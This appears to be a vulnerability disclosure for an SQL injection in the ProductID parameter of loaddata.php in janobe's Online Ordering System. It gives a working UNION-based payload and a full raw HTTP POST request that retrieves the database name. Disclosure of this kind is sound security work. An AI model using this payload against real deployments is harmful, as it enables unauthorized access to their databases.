# Online Ordering System By janobe has SQL injection vulnerability

Author： k0xx

vendor: https://www.sourcecodester.com/php/12978/online-ordering-system-phpmysqli.html

Vulnerability file: /ordering/admin/stockin/loaddata.php

Vulnerability location: /ordering/admin/stockin/loaddata.php&ProductID //ProductID is Injection point

[+]Payload: ProductID=-2' union select 1,2,database(),4,5,6,7,8,9,10,11,12,13--+ //ProductID is Injection point

Current database name: multistoredb

```sql
POST /ordering/admin/stockin/loaddata.php HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=0m2td1md252hlnr3nsbmc5ss99
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

ProductID=-2' union select 1,2,database(),4,5,6,7,8,9,10,11,12,13--+
```
![image](https://user-images.githubusercontent.com/54017627/168950699-955bc50c-f0fd-4c4d-b2e0-01dbacdd21d6.png)

![image](https://user-images.githubusercontent.com/54017627/168950677-25a8efe5-87ab-41f9-bad2-6da441f9b989.png)

